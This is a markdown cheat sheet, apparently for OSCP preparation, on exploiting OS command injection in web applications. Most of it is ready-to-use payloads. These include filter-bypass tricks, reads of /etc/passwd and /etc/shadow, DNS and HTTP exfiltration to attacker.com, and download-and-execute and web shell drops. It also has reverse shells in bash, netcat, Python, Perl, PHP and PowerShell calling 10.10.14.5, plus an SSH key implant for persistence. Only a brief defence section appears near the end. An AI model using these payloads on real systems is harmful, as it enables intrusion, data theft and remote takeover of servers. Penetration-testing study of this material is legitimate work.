# Command Injection Exploitation Guide

## Table of Contents
1. [Command Injection Basics](#command-injection-basics)
2. [Detection Techniques](#detection-techniques)
3. [Command Separators](#command-separators)
4. [Basic Payloads](#basic-payloads)
5. [Blind Command Injection](#blind-command-injection)
6. [Filter Bypass Techniques](#filter-bypass-techniques)
7. [OS-Specific Payloads](#os-specific-payloads)
8. [Reverse Shells via Command Injection](#reverse-shells-via-command-injection)
9. [OSCP Scenarios](#oscp-scenarios)

---

## Command Injection Basics

### What is Command Injection?
Allows attackers to execute arbitrary operating system commands on the server where the application is running.

### Vulnerable Code Examples

#### PHP
```php
<?php
$target = $_GET['ip'];
system("ping -c 4 " . $target);
?>
```

#### Python
```python
import os
target = request.args.get('ip')
os.system('ping -c 4 ' + target)
```

#### Node.js
```javascript
const { exec } = require('child_process');
const target = req.query.ip;
exec(`ping -c 4 ${target}`, (error, stdout) => {
    console.log(stdout);
});
```

### Impact
- **Full system compromise**
- **Data exfiltration**
- **Reverse shell access**
- **Privilege escalation**
- **Lateral movement**

---

## Detection Techniques

### Time-Based Detection
```bash
# Sleep commands to detect blind injection
; sleep 10
| sleep 10
& sleep 10
`sleep 10`
$(sleep 10)

# Windows
& timeout 10
| ping -n 10 127.0.0.1
```

### DNS-Based Detection
```bash
# Use Burp Collaborator or your own server
; nslookup attacker.com
; dig attacker.com
`nslookup attacker.com`
$(nslookup attacker.com)
```

### Output-Based Detection
```bash
# Basic test
; whoami
; id
; hostname
```

---

## Command Separators

### Linux/Unix Command Separators
```bash
;    # Semicolon - Execute regardless of previous command
|    # Pipe - Pass output to next command
||   # OR - Execute if previous fails
&    # Background - Execute in background
&&   # AND - Execute if previous succeeds
\n   # Newline
`    # Backticks - Command substitution
$()  # Command substitution (modern)
```

### Examples
```bash
# Semicolon (execute both)
ping 127.0.0.1; whoami

# Pipe (use output)
cat /etc/passwd | grep root

# AND (execute if first succeeds)
ping -c 1 127.0.0.1 && whoami

# OR (execute if first fails)
ping -c 1 invalid || whoami

# Background
ping 127.0.0.1 & whoami

# Command substitution
echo `whoami`
echo $(whoami)
```

### Windows Command Separators
```cmd
&    REM Execute regardless
&&   REM Execute if previous succeeds
|    REM Pipe output
||   REM Execute if previous fails
;    REM Works in some contexts
%0A  REM URL-encoded newline
```

---

## Basic Payloads

### Linux/Unix Payloads

#### Basic Information Gathering
```bash
; whoami
; id
; hostname
; uname -a
; cat /etc/passwd
; cat /etc/shadow
; ps aux
; netstat -tulpn
; ifconfig
; ip a
; env
; pwd
; ls -la
```

#### Chaining Commands
```bash
127.0.0.1; whoami
127.0.0.1 && whoami
127.0.0.1 | whoami
127.0.0.1 || whoami
`whoami`
$(whoami)
```

#### File Operations
```bash
; cat /etc/passwd
; head /etc/passwd
; tail /etc/passwd
; more /etc/passwd
; less /etc/passwd
; nl /etc/passwd
```

#### Current User Context
```bash
; id
; whoami
; groups
; cat /etc/passwd | grep $(whoami)
```

### Windows Payloads

#### Basic Information Gathering
```cmd
& whoami
& hostname
& ipconfig
& netstat -an
& tasklist
& net user
& net localgroup administrators
& systeminfo
& dir c:\
& type c:\windows\win.ini
```

#### Command Chaining
```cmd
127.0.0.1 & whoami
127.0.0.1 && whoami
127.0.0.1 | whoami
127.0.0.1 || whoami
```

---

## Blind Command Injection

### Time-Based Detection (Linux)
```bash
; sleep 10
| sleep 10
& sleep 10 &
`sleep 10`
$(sleep 10)
|| sleep 10
&& sleep 10

# Verify injection if response delays 10 seconds
```

### Time-Based Detection (Windows)
```cmd
& timeout /t 10
& ping -n 10 127.0.0.1
| ping -n 10 127.0.0.1
&& timeout /t 10
```

### Out-of-Band (OOB) Exfiltration

#### DNS Exfiltration (Linux)
```bash
; nslookup attacker.com
; dig attacker.com
; host attacker.com
`nslookup $(whoami).attacker.com`

# Exfiltrate data via DNS subdomain
; nslookup $(whoami).attacker.com
; nslookup $(hostname).attacker.com
; ping -c 1 $(whoami).attacker.com
```

#### HTTP Exfiltration (Linux)
```bash
; curl http://attacker.com/?data=$(whoami)
; wget http://attacker.com/?data=$(whoami)
; curl http://attacker.com/$(whoami)

# Base64 encode data
; curl http://attacker.com/?data=$(whoami|base64)
```

#### HTTP Exfiltration (Windows)
```cmd
& certutil -urlcache -f http://attacker.com/test.txt
& powershell -c "Invoke-WebRequest -Uri http://attacker.com/?data=$(whoami)"
& curl http://attacker.com/?data=%USERNAME%
```

#### File-Based Exfiltration
```bash
# Write output to web-accessible directory
; whoami > /var/www/html/output.txt
; id > /tmp/output.txt

# Then access via browser
http://target.com/output.txt
```

### Listener Setup
```bash
# HTTP Server
python3 -m http.server 80

# DNS Server (dnslog.cn or Burp Collaborator)
# Or use tcpdump
sudo tcpdump -i eth0 udp port 53
```

---

## Filter Bypass Techniques

### Space Filtering Bypass
```bash
# Use $IFS (Internal Field Separator)
;cat$IFS/etc/passwd
;cat${IFS}/etc/passwd

# Use tabs
;cat%09/etc/passwd

# Use brace expansion
;{cat,/etc/passwd}

# Hex encoding
;cat</etc/passwd

# Use redirection
;cat</etc/passwd
```

### Keyword Filtering Bypass

#### Concatenation
```bash
# Bypass "cat" filter
;c''at /etc/passwd
;c'a't /etc/passwd
;c"a"t /etc/passwd
;c\at /etc/passwd

# Variable concatenation
;a=c;b=at;$a$b /etc/passwd
```

#### Character Encoding
```bash
# Hex encoding
;$(echo -e "\x63\x61\x74") /etc/passwd  # cat

# Base64
;`echo Y2F0IC9ldGMvcGFzc3dkCg==|base64 -d`  # cat /etc/passwd

# Octal
;$(printf "\143\141\164") /etc/passwd  # cat
```

#### Wildcards
```bash
# Bypass "cat" filter
;/bin/c?t /etc/passwd
;/bin/c*t /etc/passwd
;/???/c?t /etc/passwd
```

#### Case Manipulation
```bash
# If filter is case-sensitive
;Cat /etc/passwd
;CAT /etc/passwd
;CaT /etc/passwd
```

### Quote and Escape Bypass
```bash
# Single quotes
;c'a't /etc/passwd

# Double quotes
;c"a"t /etc/passwd

# Backslash
;c\at /etc/passwd

# Mixed
;c'a't" "/e't'c/p"a"ss'w'd
```

### Variable Expansion
```bash
# Use environment variables
;$0  # Current shell
;ca$@t /etc/passwd
;cat /etc/pa$*sswd
```

### Path Bypass
```bash
# If command blacklisted, use full path
;/bin/cat /etc/passwd
;/usr/bin/cat /etc/passwd

# Use wildcards in path
;/???/??t /etc/passwd
;/???/c?t /???/p??swd
```

---

## OS-Specific Payloads

### Linux Advanced Payloads

#### Read Files (Multiple Methods)
```bash
# Standard
; cat /etc/passwd
; tac /etc/passwd
; head /etc/passwd
; tail /etc/passwd
; more /etc/passwd
; less /etc/passwd
; nl /etc/passwd

# Using other tools
; grep . /etc/passwd
; sed '' /etc/passwd
; awk '{print}' /etc/passwd
; while read line; do echo $line; done < /etc/passwd
```

#### Write Files
```bash
# Echo to file
; echo "malicious content" > /var/www/html/shell.php

# Download and save
; wget http://attacker.com/shell.php -O /var/www/html/shell.php
; curl http://attacker.com/shell.php -o /var/www/html/shell.php
```

#### Find SUID Binaries
```bash
; find / -perm -4000 2>/dev/null
; find / -perm -u=s -type f 2>/dev/null
```

#### Enumerate System
```bash
; uname -a
; cat /etc/issue
; cat /etc/os-release
; lsb_release -a
; hostname
; id
; groups
```

### Windows Advanced Payloads

#### Read Files
```cmd
& type c:\windows\win.ini
& type c:\boot.ini
& type c:\inetpub\wwwroot\web.config
& more c:\windows\win.ini
& findstr . c:\windows\win.ini
```

#### Write Files
```cmd
& echo malicious > c:\inetpub\wwwroot\shell.aspx
& certutil -urlcache -f http://attacker.com/shell.exe c:\temp\shell.exe
```

#### PowerShell Execution
```cmd
& powershell -c "whoami"
& powershell -enc base64_encoded_command
& powershell -exec bypass -c "IEX(New-Object Net.WebClient).downloadString('http://attacker.com/script.ps1')"
```

#### System Enumeration
```cmd
& systeminfo
& whoami /all
& net user
& net localgroup administrators
& wmic qfe list
& wmic product get name
& ipconfig /all
& route print
& netstat -ano
```

---

## Reverse Shells via Command Injection

### Linux Reverse Shells

#### Bash TCP
```bash
; bash -i >& /dev/tcp/10.10.14.5/443 0>&1
; bash -c 'bash -i >& /dev/tcp/10.10.14.5/443 0>&1'
; /bin/bash -i >& /dev/tcp/10.10.14.5/443 0>&1
```

#### Netcat (nc)
```bash
; nc 10.10.14.5 443 -e /bin/bash
; nc -e /bin/bash 10.10.14.5 443
; rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.14.5 443 >/tmp/f
```

#### Python
```bash
; python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.14.5",443));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'

; python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.14.5",443));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
```

#### Perl
```bash
; perl -e 'use Socket;$i="10.10.14.5";$p=443;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'
```

#### PHP
```bash
; php -r '$sock=fsockopen("10.10.14.5",443);exec("/bin/sh -i <&3 >&3 2>&3");'
```

#### Telnet
```bash
; rm -f /tmp/p; mknod /tmp/p p && telnet 10.10.14.5 443 0/tmp/p
```

#### Curl Download and Execute
```bash
; curl http://10.10.14.5/shell.sh | bash
; wget http://10.10.14.5/shell.sh -O /tmp/shell.sh; bash /tmp/shell.sh
```

### Windows Reverse Shells

#### PowerShell Reverse Shell
```cmd
& powershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient('10.10.14.5',443);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"
```

#### PowerShell One-Liner (Base64)
```cmd
& powershell -enc <base64_encoded_reverse_shell>
```

#### Certutil Download and Execute
```cmd
& certutil -urlcache -f http://10.10.14.5/nc.exe c:\temp\nc.exe & c:\temp\nc.exe 10.10.14.5 443 -e cmd.exe
```

#### Mshta
```cmd
& mshta http://10.10.14.5/shell.hta
```

### Listener Setup
```bash
# Netcat listener
nc -nlvp 443

# Multi-handler (for meterpreter)
msfconsole -q -x "use exploit/multi/handler; set payload windows/meterpreter/reverse_tcp; set LHOST 10.10.14.5; set LPORT 443; exploit"
```

---

## OSCP Scenarios

### Scenario 1: Ping Command Injection
```
Vulnerable Parameter: IP address field in ping tool

Payload:
127.0.0.1; bash -c 'bash -i >& /dev/tcp/10.10.14.5/443 0>&1'

Steps:
1. Identify ping functionality
2. Test with: 127.0.0.1; whoami
3. Confirm injection
4. Start listener: nc -nlvp 443
5. Execute reverse shell payload
```

### Scenario 2: File Path Injection
```
Vulnerable Parameter: Filename in download/backup feature

Payload:
file.txt; cat /etc/passwd
../../etc/passwd; whoami

Steps:
1. Test basic injection: test.txt; whoami
2. Read sensitive files: test.txt; cat /var/www/html/config.php
3. Exfiltrate via curl: test.txt; curl http://10.10.14.5/?data=$(cat /etc/passwd|base64)
```

### Scenario 3: Blind Command Injection (Time-Based)
```
No visible output, test with time delays

Test Payloads:
; sleep 10
| sleep 10
& sleep 10

If 10-second delay occurs, inject reverse shell:
; bash -c 'bash -i >& /dev/tcp/10.10.14.5/443 0>&1'
```

### Scenario 4: Command Injection → SSH Key Upload
```bash
# Generate SSH key on attacker machine
ssh-keygen -t rsa -f oscp_key

# Read public key
cat oscp_key.pub

# Inject to add key to authorized_keys
; echo "ssh-rsa AAAAB3NzaC1yc2E..." >> /home/user/.ssh/authorized_keys

# Or for root
; echo "ssh-rsa AAAAB3NzaC1yc2E..." >> /root/.ssh/authorized_keys

# SSH in
ssh -i oscp_key user@target.com
```

### Scenario 5: Complete OSCP Exploitation Chain
```bash
1. Discovery:
   Input: 127.0.0.1; whoami
   Output: www-data

2. Enumerate:
   ; cat /etc/passwd
   ; ls -la /home
   ; find / -perm -4000 2>/dev/null

3. Get Shell:
   ; bash -c 'bash -i >& /dev/tcp/10.10.14.5/443 0>&1'

4. Privilege Escalation (example):
   - Find writable /etc/passwd
   - Add root user
   - SSH as root

5. Capture Flag:
   cat /root/proof.txt
```

---

## Testing Checklist

### Basic Testing
- [ ] Test all input fields
- [ ] Test URL parameters
- [ ] Test HTTP headers (User-Agent, Referer)
- [ ] Test file upload fields (filename)
- [ ] Test API endpoints

### Command Separators
- [ ] `;` semicolon
- [ ] `|` pipe
- [ ] `||` OR
- [ ] `&` background
- [ ] `&&` AND
- [ ] Backticks
- [ ] `$()` substitution
- [ ] Newline (`%0A`)

### Bypass Techniques
- [ ] Space bypass: `$IFS`, `%09`, `{cat,/etc/passwd}`
- [ ] Quote bypass: `c'a't`, `c"a"t`, `c\at`
- [ ] Path bypass: `/bin/cat`, `/???/c?t`
- [ ] Case bypass: `Cat`, `CAT`
- [ ] Encoding: hex, base64, octal

---

## Defense (For Understanding)

### Input Validation
```php
// Whitelist approach
$allowed_ips = ['127.0.0.1', '192.168.1.1'];
if (in_array($input, $allowed_ips)) {
    system("ping -c 4 " . escapeshellarg($input));
}
```

### Use Safe Functions
```php
// BAD
system($input);
exec($input);
shell_exec($input);
passthru($input);

// BETTER (but still risky)
escapeshellarg($input);
escapeshellcmd($input);

// BEST (avoid shell entirely)
// Use language-specific safe APIs
```

### Disable Dangerous Functions (PHP)
```ini
disable_functions = exec,passthru,shell_exec,system,proc_open,popen
```

---

## Tools

```bash
# Commix (Command Injection Exploitation)
git clone https://github.com/commixproject/commix
python commix.py --url="http://target.com/ping.php?ip=127.0.0.1"

# Manual testing with Burp Suite Intruder
# Use SecLists command injection wordlists
```

---

## Quick Reference

### Quick Test Payloads (Linux)
```bash
; whoami
| whoami
|| whoami
& whoami
&& whoami
`whoami`
$(whoami)
; sleep 10
```

### Quick Test Payloads (Windows)
```cmd
& whoami
&& whoami
| whoami
|| whoami
& timeout /t 10
```

### Quick Reverse Shell (Linux)
```bash
; bash -c 'bash -i >& /dev/tcp/10.10.14.5/443 0>&1'
```

### Quick Reverse Shell (Windows)
```cmd
& powershell -c "$client = New-Object System.Net.Sockets.TCPClient('10.10.14.5',443);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"
```

---

**Remember**: Command injection is one of the most critical vulnerabilities. It often leads directly to RCE and full system compromise. Always test thoroughly!
